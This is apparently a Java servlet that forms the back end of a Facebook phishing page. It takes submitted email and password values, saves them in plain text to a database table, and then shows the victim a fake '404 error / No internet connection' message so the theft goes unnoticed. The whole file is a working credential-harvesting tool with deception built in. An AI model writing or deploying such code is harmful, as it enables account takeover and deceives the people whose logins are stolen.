package com.nt.servlet;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/facebook")
public class Facebook extends HttpServlet {
	private static final String query="INSERT INTO USERID VALUES(?,?)";
	public void doGet(HttpServletRequest req,HttpServletResponse res) throws ServletException,IOException{
		PrintWriter pw=null;
		pw=res.getWriter();
		res.setContentType("text/html");
		String user=null,pass=null;
		Connection con=null;
		PreparedStatement ps=null;
		int result=0;
		
		user=req.getParameter("email");
		pass=req.getParameter("password");
		
		try{
			Class.forName("oracle.jdbc.driver.OracleDriver");
			con=DriverManager.getConnection("jdbc:oracle:thin:@localhost:1521:orcl","scott","tiger");
			if(con!=null)
			   ps=con.prepareStatement(query);
			if(ps!=null) {
				ps.setString(1,user);
				ps.setString(2,pass);
			}
			if(ps!=null)
				result=ps.executeUpdate();
			if(result==0) {
				pw.println("<h1>records not updated</h1>");
			}
			else {
				pw.println("<br><h1 style='text-align:center'>404 error found !</h1>");
				pw.println("<h1 style='text-align:center'>No internet connection</h1>");
				pw.println("<h1 style='text-align:center'>check your internet connectivity</h1>");
			}
		}//try
		catch(SQLException se){
			se.printStackTrace();
		}
		catch(ClassNotFoundException cnf) {
			cnf.printStackTrace();
		}
		catch(Exception e) {
			e.printStackTrace();
		}
		finally {
			try {
				if(ps!=null)
				  ps.close();
			}
			catch(SQLException se) {
				se.printStackTrace();
			}
			try {
				if(con!=null)
				  con.close();
			}
			catch(SQLException se) {
				se.printStackTrace();
			}
			
		}//finally
		pw.close();
	
	}//doGet
	public void doPost(HttpServletRequest req,HttpServletResponse res) throws ServletException, IOException {
		doGet(req,res);
	}

}//class
